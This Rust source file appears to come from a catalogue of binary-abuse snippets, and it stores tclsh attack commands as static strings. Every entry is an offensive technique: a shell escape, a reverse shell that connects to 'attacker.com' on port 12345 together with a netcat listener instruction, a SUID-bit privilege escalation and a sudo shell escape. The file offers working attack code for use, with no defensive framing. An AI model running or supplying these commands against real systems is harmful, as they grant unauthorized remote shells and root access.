pub static BIN_NAME: &'static str = "tclsh";
pub static SH_CODE: &'static str = r#"
    
    tclsh
    exec /bin/sh <@stdin >@stdout 2>@stderr
"#;
pub static NIRS_DESC: &'static str =
    "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static NIRS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which tclsh) .

    ./tclsh
    exec /bin/sh -p <@stdin >@stdout 2>@stderr
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo tclsh
    exec /bin/sh <@stdin >@stdout 2>@stderr
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static NIRS: Code<'static> = Code { 
	title: "NIRS_CODE",
	code: NIRS_CODE,
	tag: Tag::NIRS,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
